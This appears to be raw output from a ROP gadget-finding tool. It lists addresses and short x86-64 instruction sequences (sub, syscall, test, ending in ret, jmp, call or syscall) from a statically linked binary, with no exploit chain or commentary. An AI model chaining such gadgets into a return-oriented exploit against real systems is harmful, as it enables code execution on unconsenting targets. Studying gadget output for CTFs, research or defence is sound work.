0x00000000004ac3a1 : sub dh, dh ; jmp qword ptr [rax]
0x00000000004801da : sub dl, dh ; call r11
0x00000000004758ae : sub dword ptr [rax + 0x101], edi ; syscall
0x00000000004a7ead : sub dword ptr [rax + 0x1e], eax ; cli ; test bh, dl ; retf 0xdf7f
0x000000000042008a : sub dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000424d8c : sub dword ptr [rax], eax ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x0000000000423dad : sub dword ptr [rax], eax ; add rsp, 0x20 ; call 0x410848
0x0000000000419949 : sub dword ptr [rax], eax ; ret
0x00000000004a8b42 : sub dword ptr [rbx + 0x5c347ebb], edx ; sbb ebp, ebx ; retf
0x000000000042e7d7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42e7ed ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042e927 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42e93d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042ea77 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42ea8d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042ebc7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42ebdd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042ed17 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42ed2d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042ee67 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42ee7d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042efb7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42efcd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042f107 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42f11d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042f257 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42f26d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042f3a7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42f3bd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042f4f7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42f50d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042f647 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42f65d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042f797 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42f7ad ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042f8e7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42f8fd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042fa37 : sub dword ptr [rdi + 0x10], ebx ; jb 0x42fa4d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004311a7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4311bd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004312f7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43130d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000431447 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43145d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000431597 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4315ad ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004316e7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4316fd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000431837 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43184d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000431987 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43199d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000431ad7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x431aed ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000431c27 : sub dword ptr [rdi + 0x10], ebx ; jb 0x431c3d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000431d77 : sub dword ptr [rdi + 0x10], ebx ; jb 0x431d8d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000431ec7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x431edd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000432017 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43202d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000432167 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43217d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004322b7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4322cd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000432407 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43241d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042e733 : sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x000000000042e72f : sub dword ptr [rdi - 0x20], esp ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x000000000042e7dd : sub dword ptr [rdi], esp ; jmp r9
0x0000000000424dab : sub dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x0000000000482575 : sub dword ptr [rdx], eax ; add byte ptr [rdi + rcx + 0x44], cl ; retf 0x8d48
0x000000000042acb7 : sub dword ptr [rip - 0x76b30000], ecx ; retf
0x000000000042ded6 : sub dword ptr [rip - 0xcfffffe], 0xf ; outsd dx, dword ptr [rsi] ; push rdi ; ret
0x000000000042ab71 : sub dword ptr [rsi + 0xe], 0 ; add byte ptr [rcx + 0x29], cl ; retf
0x00000000004a93fa : sub dword ptr [rsi], 0x76 ; retf
0x000000000040dc6d : sub dword ptr [rsp + 0xf0], eax ; syscall
0x000000000042c847 : sub eax, -1 ; jne 0x42c858 ; vzeroupper ; ret
0x000000000042371a : sub eax, 0x10 ; ret
0x0000000000469644 : sub eax, 0x83000000 ; ret
0x0000000000466a15 : sub eax, 0x83000000 ; ret 0x8b01
0x00000000004a6b46 : sub eax, 0xea4ca798 ; retf
0x0000000000466ea5 : sub eax, 0xf410004 ; xchg eax, esp ; ret
0x0000000000424e12 : sub eax, 0xf480002 ; ret 0x66c3
0x0000000000459064 : sub eax, 1 ; mov dword ptr [rbx + 8], eax ; pop rbx ; ret
0x00000000004472d4 : sub eax, 1 ; ret
0x0000000000481bf6 : sub eax, dword ptr [0] ; ret
0x000000000040392d : sub eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000400b0a : sub eax, dword ptr [rax] ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004004cc : sub eax, dword ptr [rax] ; nop ; ret
0x0000000000401c8f : sub eax, dword ptr [rbx + 8] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000045e1e6 : sub eax, dword ptr [rcx + 0xf] ; mov dh, 0x47 ; or al, 0x83 ; ret
0x000000000041992e : sub eax, dword ptr [rdi + 0x18] ; ret
0x0000000000448ffa : sub eax, dword ptr [rdx + rcx*4] ; je 0x448fe6 ; ret
0x0000000000424f72 : sub eax, dword ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x0000000000418c43 : sub eax, dword ptr [rsi + 0x10] ; ret
0x000000000044743d : sub eax, eax ; cmp eax, ecx ; jle 0x447481 ; movsxd rax, ecx ; ret
0x0000000000481044 : sub eax, eax ; ret
0x000000000042c893 : sub eax, ecx ; je 0x42c8a9 ; sbb eax, eax ; or eax, 1 ; ret
0x0000000000418319 : sub eax, ecx ; lea eax, [r8 - 1] ; ret
0x00000000004846c0 : sub eax, ecx ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x000000000042653c : sub eax, ecx ; ret
0x00000000004413e9 : sub eax, edi ; ret
0x000000000047466e : sub eax, edi ; shr rax, 2 ; ret
0x00000000004847a3 : sub eax, edx ; mov dword ptr [rdx], eax ; mov eax, 2 ; ret
0x0000000000418c6b : sub eax, edx ; ret
0x0000000000474a60 : sub eax, edx ; shr rax, 2 ; vzeroupper ; ret
0x000000000042c85c : sub eax, edx ; vzeroupper ; ret
0x000000000044749d : sub eax, esi ; ret
0x0000000000481043 : sub eax, r8d ; ret
0x00000000004a7d9e : sub ebp, eax ; fcomp qword ptr [rdi - 0x4a] ; ret 0x474c
0x0000000000414660 : sub ebp, eax ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000046487f : sub ebp, ecx ; retf
0x0000000000413236 : sub ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00000000004a6835 : sub ebx, dword ptr [rbx - 0xb] ; pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x000000000044d798 : sub ecx, dword ptr [rax - 0x75] ; push rax ; or dh, dh ; ret 0x8902
0x0000000000473bf4 : sub ecx, dword ptr [rcx + rcx*4 - 0x40] ; vzeroupper ; ret
0x0000000000418c70 : sub edx, dword ptr [rax + 0x10] ; mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x0000000000418c65 : sub edx, dword ptr [rax + 0x18] ; mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x000000000042bce4 : sub edx, eax ; jbe 0x42bd27 ; add rax, rdi ; ret
0x000000000042bcf4 : sub edx, eax ; jbe 0x42bd29 ; lea rax, [rdi + rax + 0x10] ; ret
0x000000000042bd04 : sub edx, eax ; jbe 0x42bd29 ; lea rax, [rdi + rax + 0x20] ; ret
0x000000000042bd14 : sub edx, eax ; jbe 0x42bd29 ; lea rax, [rdi + rax + 0x30] ; ret
0x0000000000424111 : sub edx, esi ; add dword ptr [rax], eax ; cmovne rax, rdx ; ret
0x0000000000413c0f : sub edx, esi ; mov qword ptr [rsp], rcx ; mov rdi, rbx ; call rax
0x0000000000416004 : sub edx, esi ; sar rdx, 2 ; call 0x412268
0x000000000048a903 : sub esp, -0x80 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000046fbf6 : sub esp, 0x80 ; call 0x44c698
0x00000000004103e2 : sub esp, 0x80 ; call 0x44c6c8
0x00000000004925c1 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000475503 : sub esp, 8 ; syscall
0x00000000004475f6 : sub esp, dword ptr [rdi] ; add byte ptr [rax + 0x39], cl ; retf 0x870f
0x00000000004240e1 : sub esp, dword ptr [rdi] ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x0000000000418318 : sub r8, rcx ; lea eax, [r8 - 1] ; ret
0x0000000000423719 : sub rax, 0x10 ; ret
0x00000000004472d3 : sub rax, 1 ; ret
0x0000000000481bf5 : sub rax, qword ptr [0] ; ret
0x000000000041992d : sub rax, qword ptr [rdi + 0x18] ; ret
0x0000000000481bf4 : sub rax, qword ptr fs:[0] ; ret
0x00000000004853b2 : sub rax, r8 ; ret
0x00000000004413e8 : sub rax, rdi ; ret
0x000000000047466d : sub rax, rdi ; shr rax, 2 ; ret
0x00000000004473a3 : sub rax, rdx ; ret
0x000000000044143f : sub rax, rdx ; vzeroupper ; ret
0x000000000044749c : sub rax, rsi ; ret
0x000000000042bce3 : sub rdx, rax ; jbe 0x42bd28 ; add rax, rdi ; ret
0x0000000000416003 : sub rdx, rsi ; sar rdx, 2 ; call 0x412269
0x000000000048a902 : sub rsp, -0x80 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000046fbf5 : sub rsp, 0x80 ; call 0x44c699
0x00000000004103e1 : sub rsp, 0x80 ; call 0x44c6c9
0x00000000004925c0 : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000475502 : sub rsp, 8 ; syscall
0x000000000047b6bf : syscall
0x0000000000417b84 : test al, 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000475605 : test al, 0 ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x000000000048b093 : test al, 0 ; add byte ptr [rax], al ; ret
0x000000000046c4d9 : test al, 0x24 ; add byte ptr [rax - 0x75], cl ; add al, 0xf8 ; jmp rax
0x00000000004b1238 : test al, 0x25 ; cli ; call qword ptr [rdi]
0x000000000044b56e : test al, 0x45 ; mov esp, esi ; call r15
0x00000000004b3404 : test al, 0x7a ; add byte ptr [rax], al ; cmp byte ptr [rdx], ah ; cld ; jmp qword ptr [rcx]
0x00000000004a70f7 : test al, 0x97 ; xchg eax, esp ; ret
0x00000000004b5f38 : test al, 0x9f ; std ; jmp qword ptr [rax]
0x00000000004a6ade : test al, 0xa7 ; mov bx, 0xf32d ; retf
0x00000000004abf04 : test al, 5 ; add byte ptr [rax], al ; clc ; cwde ; cmc ; call rax
0x000000000040d881 : test al, ah ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; retf 0xeb08
0x000000000047e8c5 : test al, al ; cmove rcx, rax ; mov rax, rcx ; ret
0x00000000004267fa : test al, al ; jne 0x4267e8 ; xor eax, eax ; sub eax, ecx ; ret
0x0000000000448db0 : test al, al ; jne 0x448ce9 ; jmp 0x448d8e
0x0000000000478073 : test al, bh ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00000000004a9a04 : test bh, ch ; cmp cl, byte ptr [rsi] ; and byte ptr [rbx + 0x3d], bh ; retf
0x0000000000472cac : test bh, dh ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00000000004a7eb1 : test bh, dl ; retf 0xdf7f
0x000000000041a248 : test bl, al ; add dword ptr [rax], eax ; add byte ptr [rax + 1], cl ; ret
0x0000000000410a1f : test byte ptr [rax + rax - 0x76b80000], ch ; ret
0x000000000044c872 : test byte ptr [rax - 0x73], 5 ; cmpsb byte ptr [rsi], byte ptr [rdi] ; jmp qword ptr [rsi]
0x0000000000459751 : test byte ptr [rax - 0x76b80000], ch ; ret 0x2948
0x000000000046aca9 : test byte ptr [rax - 0x7c000019], ah ; ret
0x000000000041f7f8 : test byte ptr [rax - 0x7cb7ffd7], ah ; retf 0x4901
0x000000000040eb7a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; call qword ptr [rbx]
0x000000000041a60a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x00000000004859ba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rbx
0x000000000044561a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi] ; ret
0x0000000000444a5a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dh ; ret
0x0000000000418f9a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, rdi ; ret
0x000000000041351a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; movzx eax, byte ptr [rdx] ; ret
0x00000000004120da : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x0000000000418f5a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000417e9a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000044545a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; xor rax, rax ; ret
0x000000000044f8c2 : test byte ptr [rbp + rcx*4 + 0x3c], cl ; ret
0x000000000046abac : test byte ptr [rbp - 0x7c000018], bl ; ret
0x0000000000472b3f : test byte ptr [rcx + 0xf], 0x45 ; retf 0x148
0x000000000048c19b : test byte ptr [rcx + rax - 0x20], cl ; jmp rax
0x000000000048dd32 : test byte ptr [rcx + rcx*4 - 0x19], 0x41 ; call rdi
0x000000000042a5c6 : test byte ptr [rcx], bh ; add al, 0 ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000042ada6 : test byte ptr [rcx], bh ; or al, 0 ; add byte ptr [rbp - 0x77], cl ; retf
0x00000000004298d6 : test byte ptr [rcx], ch ; adc dword ptr [rax], eax ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000042acb6 : test byte ptr [rcx], ch ; or eax, 0x894d0000 ; retf
0x00000000004295f6 : test byte ptr [rcx], cl ; adc al, 0 ; add byte ptr [rbp - 0x77], cl ; retf
0x0000000000456cb4 : test byte ptr [rdi + 0x48000001], bl ; mov edx, eax ; jmp 0x456c77
0x000000000044c004 : test byte ptr [rdi - 0x7d000000], bl ; ret
0x000000000046ffc9 : test byte ptr [rdi], 0x84 ; popfq ; add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; retf
0x0000000000424946 : test byte ptr [rdi], 0x84 ; ret
0x000000000044ab4f : test byte ptr [rdi], 0x94 ; ret 0xc221
0x000000000044a666 : test byte ptr [rdi], 0x94 ; ret 0xca21
0x0000000000473034 : test byte ptr [rdi], bh ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x000000000047304c : test byte ptr [rdi], dl ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00000000004570b9 : test byte ptr [rdx + 0x48fffffd], bl ; mov edx, eax ; jmp 0x45707c
0x000000000042068e : test byte ptr [rdx], ah ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x0000000000472c94 : test byte ptr [rdx], al ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x000000000042218e : test byte ptr [rdx], al ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x000000000042268e : test byte ptr [rdx], dl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x0000000000469734 : test byte ptr [rip - 0x7c000003], dl ; ret
0x000000000045f144 : test byte ptr [rip - 0x7c000011], al ; ret
0x000000000047388d : test byte ptr [rsi + 0x48000000], bl ; bsf eax, edx ; ret
0x00000000004123f4 : test byte ptr [rsi + rdi*8 - 0x76b30001], dh ; retf 0x8948
0x0000000000453ab1 : test byte ptr [rsi - 0x8fffffc], cl ; ret 0
0x00000000004412cd : test byte ptr [rsi], bh ; add byte ptr [rax], al ; bsf rax, rdx ; ret
0x000000000042b8e6 : test cl, bh ; add byte ptr [rax], al ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000042a006 : test cl, bh ; or dword ptr [rax], eax ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000042b706 : test cl, bl ; add al, byte ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x0000000000489f8a : test cl, bl ; add eax, dword ptr [rax] ; add byte ptr [rax + 1], cl ; ret
0x0000000000429d26 : test cl, bl ; or al, 0 ; add byte ptr [rbp - 0x77], cl ; retf
0x0000000000427db6 : test cl, ch ; adc al, 0 ; add byte ptr [rbp - 0x77], cl ; retf
0x00000000004280b6 : test cl, ch ; adc dword ptr [rax], eax ; add byte ptr [rbp - 0x77], cl ; retf
0x0000000000428fb6 : test cl, ch ; add al, byte ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000042b7f6 : test cl, ch ; add dword ptr [rax], eax ; add byte ptr [rbp - 0x77], cl ; retf
0x0000000000428cb6 : test cl, ch ; add eax, 0x894d0000 ; retf
0x00000000004289b6 : test cl, ch ; or byte ptr [rax], al ; add byte ptr [rbp - 0x77], cl ; retf
0x00000000004286b6 : test cl, ch ; or eax, dword ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000044cf41 : test cl, ch ; retf 0xfffe
0x000000000042a736 : test cl, cl ; add al, byte ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000042b616 : test cl, cl ; add eax, dword ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x0000000000446f5f : test cl, cl ; jne 0x446f54 ; ret
0x000000000044700f : test cl, cl ; jne 0x447004 ; ret
0x00000000004472cf : test cl, cl ; jne 0x4472c8 ; sub rax, 1 ; ret
0x0000000000451445 : test dh, dh ; mov edx, 0xffffffff ; cmovs eax, edx ; ret
0x00000000004454a4 : test dl, 0x40 ; jne 0x445469 ; lea rax, [rdi + 7] ; ret
0x00000000004454d2 : test dl, 4 ; jne 0x445469 ; lea rax, [rdi + 3] ; ret
0x000000000040dbd6 : test dl, dl ; jne 0x40dbb8 ; ret
0x000000000044717f : test dl, dl ; jne 0x447178 ; lea rax, [rcx - 1] ; ret
0x0000000000480fb7 : test dl, dl ; jne 0x480f93 ; movsx eax, cl ; neg eax ; ret
0x0000000000491c83 : test dword ptr [rax + 0xf000008], ecx ; xchg eax, ebx ; ret 0x3d83
0x0000000000472cad : test dword ptr [rax], 0x83480000 ; ret 0xe901
0x0000000000468c16 : test dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret
0x00000000004022a1 : test dword ptr [rax], eax ; add rax, r13 ; jmp rax
0x000000000044de51 : test dword ptr [rax], eax ; add rax, rbp ; jmp rax
0x000000000045ebb9 : test dword ptr [rax], ecx ; idiv edi ; call qword ptr [rax]
0x0000000000469326 : test dword ptr [rax], esi ; idiv edi ; dec dword ptr [rax - 0x39] ; ret 0xac20
0x00000000004022a0 : test dword ptr [rax], r8d ; add rax, r13 ; jmp rax
0x000000000044de50 : test dword ptr [rax], r8d ; add rax, rbp ; jmp rax
0x000000000042bc68 : test dword ptr [rbx + 0x31000000], esp ; rol bl, 0x83 ; ret 0x6620
0x000000000044a379 : test dword ptr [rbx + 0x48000000], ebp ; add esp, 0x78 ; ret
0x000000000042d9d7 : test dword ptr [rbx + 7], edx ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000042de26 : test dword ptr [rbx + rax], eax ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000042caa8 : test dword ptr [rbx - 0x3a000003], esp ; std ; xlatb ; ret 0xe883
0x00000000004204c8 : test dword ptr [rbx], edx ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00000000004757bb : test dword ptr [rcx + 0x48000000], edi ; add esp, 0x78 ; ret
0x000000000042d9ad : test dword ptr [rcx + 7], esi ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000042d8bd : test dword ptr [rcx + 8], esp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000042d7cd : test dword ptr [rcx + 9], edx ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000041d8c2 : test dword ptr [rcx + rcx*4 + 0x54], 0x93e80824 ; ret 0xffff
0x00000000004119b8 : test dword ptr [rcx - 0x16000002], esi ; retf 0xfffe
0x000000000048e114 : test dword ptr [rdi + rdi*8 - 1], esi ; dec dword ptr [rax - 0x7d] ; ret
0x000000000041d85c : test dword ptr [rdi], eax ; add eax, 0x39480000 ; ret 0xf275
0x000000000042d6f2 : test dword ptr [rdx + rcx], ebp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000463517 : test dword ptr [rip + 0xf660004], eax ; outsd dx, dword ptr [rsi] ; ret 0x290f
0x0000000000473673 : test dword ptr [rip - 0x76ffffff], edi ; ret 0x8948
0x0000000000449fe6 : test dword ptr [rsi + 0x48000000], ebp ; add esp, 0x68 ; ret
0x0000000000446ce2 : test dword ptr [rsi + 1], ebp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000045fa81 : test dword ptr [rsi - 0x16000007], esi ; ret
0x00000000004105bd : test dword ptr [rsi - 0x77000000], esp ; ret 0xe281
0x000000000042dbf8 : test dword ptr [rsi], esp ; add eax, 0xc0310000 ; ret
0x00000000004a7f8d : test eax, 0x35eea9cd ; outsb dx, byte ptr [rsi] ; retf
0x00000000004a8de0 : test eax, 0x7d4c8c5d ; ret 0xd8f
0x0000000000433876 : test eax, 0x7f0f41f3 ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x00000000004637a3 : test eax, 0x8900020e ; ret
0x000000000046c833 : test eax, 0x8b480024 ; add al, 0xf8 ; jmp rax
0x0000000000495315 : test eax, 0xaa80fffa ; cli ; call rax
0x000000000044c57b : test eax, eax ; cmove eax, edx ; ret
0x000000000040040c : test eax, eax ; je 0x400416 ; call rax
0x0000000000423691 : test eax, eax ; je 0x4236a8 ; lea rax, [rdx - 0x10] ; ret
0x000000000042b9b8 : test eax, eax ; je 0x42b9c4 ; xchg eax, edx ; sub eax, edx ; ret
0x000000000044ad88 : test eax, eax ; je 0x44ad93 ; ret
0x000000000044dce6 : test eax, eax ; je 0x44dcf5 ; ret
0x0000000000459a64 : test eax, eax ; je 0x459a6e ; call rax
0x000000000045ae69 : test eax, eax ; je 0x45ae73 ; call rax
0x0000000000485170 : test eax, eax ; je 0x485188 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048f5d8 : test eax, eax ; je 0x48f5e5 ; ret
0x000000000048f6e8 : test eax, eax ; je 0x48f6f5 ; ret
0x0000000000490e81 : test eax, eax ; je 0x490e90 ; call rax
0x0000000000417c8c : test eax, eax ; jne 0x417c85 ; ret
0x0000000000418c24 : test eax, eax ; jne 0x418c1d ; ret
0x000000000042bc95 : test eax, eax ; jne 0x42bcf6 ; xor eax, eax ; ret
0x000000000042c111 : test eax, eax ; jne 0x42c139 ; xor eax, eax ; vzeroupper ; ret
0x000000000044a146 : test eax, eax ; jne 0x44a166 ; xor eax, eax ; syscall
0x000000000044a216 : test eax, eax ; jne 0x44a239 ; mov eax, 1 ; syscall
0x000000000044a353 : test eax, eax ; jne 0x44a3c1 ; mov eax, 0x48 ; syscall
0x000000000044a4e6 : test eax, eax ; jne 0x44a509 ; mov eax, 3 ; syscall
0x000000000044c6b0 : test eax, eax ; jne 0x44c6ab ; pop rdx ; pop r10 ; ret
0x00000000004720e0 : test eax, eax ; jne 0x4720b0 ; xor eax, eax ; jmp 0x4720b5
0x0000000000475795 : test eax, eax ; jne 0x4757ff ; mov eax, 0x101 ; syscall
0x000000000048f617 : test eax, eax ; jne 0x48f625 ; ret
0x000000000048f632 : test eax, eax ; jne 0x48f645 ; ret
0x000000000048f862 : test eax, eax ; jne 0x48f875 ; ret
0x00000000004057c4 : test eax, eax ; jns 0x405798 ; mov r15, r12 ; jmp 0x40579f
0x000000000047bd80 : test eax, eax ; js 0x47bd97 ; pop rbx ; ret
0x000000000047e09d : test eax, ebp ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; retf
0x0000000000469d15 : test eax, ebp ; idiv bh ; jmp qword ptr [rax]
0x000000000047066a : test eax, ebx ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000044b029 : test ebp, ebp ; jne 0x44b048 ; mov rdi, qword ptr [rbx] ; call r12
0x000000000044bb94 : test ebp, ebp ; jne 0x44bbc0 ; mov rdi, qword ptr [rbx] ; call r12
0x000000000044bbc7 : test ebp, ebp ; jne 0x44bc19 ; mov rdi, qword ptr [rbp] ; call r12
0x000000000044bbf3 : test ebp, ebp ; jne 0x44bc79 ; mov rdi, qword ptr [rbp] ; call r12
0x0000000000490351 : test ebp, ebp ; jne 0x490340 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000490f0b : test ebp, ebp ; jne 0x490ef8 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041b7c8 : test ebx, ebp ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x000000000042bbd0 : test ebx, ebx ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; xlatb ; ret 0xc085
0x00000000004224d0 : test ebx, edi ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x0000000000421fc8 : test ebx, esi ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x0000000000455249 : test ecx, eax ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00000000004780c8 : test ecx, eax ; add dword ptr [rax], eax ; add byte ptr [rcx], dh ; fisttp dword ptr [rax - 0x7d] ; ret
0x0000000000445492 : test ecx, ebx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7520
0x0000000000474749 : test ecx, ecx ; jne 0x474708 ; mov rax, rdx ; ret
0x000000000044b04f : test edi, edi ; jne 0x44b099 ; mov rdi, qword ptr [rbp] ; call r12
0x000000000044b077 : test edi, edi ; jne 0x44b0b9 ; mov rdi, qword ptr [rbp] ; call r12
0x000000000044bc7f : test edi, edi ; jne 0x44bcea ; mov rdi, qword ptr [r13] ; call r12
0x000000000044bcaf : test edi, edi ; jne 0x44bd1b ; mov rdi, qword ptr [r13] ; call r12
0x000000000047f4fa : test edi, edi ; jne 0x47f4d5 ; ret
0x000000000048486d : test edi, edi ; mov byte ptr [rsi], al ; jne 0x484861 ; mov rax, rsi ; ret
0x0000000000441282 : test edx, edx ; je 0x441290 ; bsf eax, edx ; ret
0x0000000000441282 : test edx, edx ; je 0x441291 ; bsf eax, edx ; ret
0x000000000044132b : test edx, edx ; je 0x441347 ; bsf rax, rdx ; ret
0x000000000044132b : test edx, edx ; je 0x441348 ; bsf rax, rdx ; ret
0x000000000044cfba : test edx, edx ; je 0x44cfd1 ; lea rdi, [rcx + rax + 0x20] ; jmp rdx
0x00000000004738fa : test edx, edx ; je 0x473927 ; bsf rax, rdx ; ret
0x00000000004738fa : test edx, edx ; je 0x473928 ; bsf rax, rdx ; ret
0x00000000004150d3 : test edx, edx ; jne 0x4150e5 ; ret
0x0000000000416d6f : test edx, edx ; jne 0x416d65 ; ret
